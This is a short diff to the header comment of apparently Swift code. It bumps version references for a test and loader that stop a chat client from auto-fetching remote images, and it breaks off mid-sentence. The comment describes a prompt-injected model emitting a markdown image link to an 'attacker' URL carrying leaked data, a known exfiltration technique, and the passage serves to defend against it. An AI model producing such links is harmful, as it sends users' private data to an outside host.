@@ -1,5 +1,5 @@
-// ports: teemoonTests/MarkdownAttachmentExfiltrationTests.swift @ v1.0.4
-//        teemoon/Views/Chat/NoRemoteAttachmentLoader.swift @ v1.0.4
+// ports: teemoonTests/MarkdownAttachmentExfiltrationTests.swift @ v1.0.5
+//        teemoon/Views/Chat/NoRemoteAttachmentLoader.swift @ v1.0.5
 //
 // The transcript renders assistant-authored markdown. A hostile or prompt-injected model that emits
 // `![](https://attacker/?leak=…)` must not cause the client to fetch that url — on iOS Textual auto-fetches image
